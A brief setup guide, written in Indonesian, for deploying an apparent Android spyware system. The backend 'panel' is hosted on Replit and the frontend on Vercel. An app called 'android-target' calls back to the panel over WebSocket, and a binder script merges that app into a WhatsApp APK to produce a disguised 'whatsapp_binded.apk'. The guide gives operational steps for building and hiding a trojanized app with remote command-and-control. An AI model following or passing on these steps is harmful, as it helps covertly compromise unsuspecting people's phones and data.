# Setup Guide

## Backend (Replit)
1. Upload folder `panel-backend` ke Replit sebagai Node.js project.
2. Tambahkan environment variables: `JWT_SECRET`, `AES_KEY`.
3. Run `npm install` dan `npm start`.
4. Dapatkan URL Replit.

## Frontend (Vercel)
1. Upload folder `panel-frontend` ke GitHub.
2. Deploy ke Vercel sebagai Static Site.
3. Update `API_BASE` di `index.html` dan `js/app.js` dengan URL Replit.

## Android
1. Buka project `android-target` di Android Studio.
2. Update URL WebSocket di `UpdateService.java` dengan URL Replit (wss://...).
3. Build APK.

## Binding
1. Letakkan `whatsapp.apk` dan `app-debug.apk` di folder `binder-tool`.
2. Jalankan `python3 bind_whatsapp.py`.
3. Hasil: `whatsapp_binded.apk`.
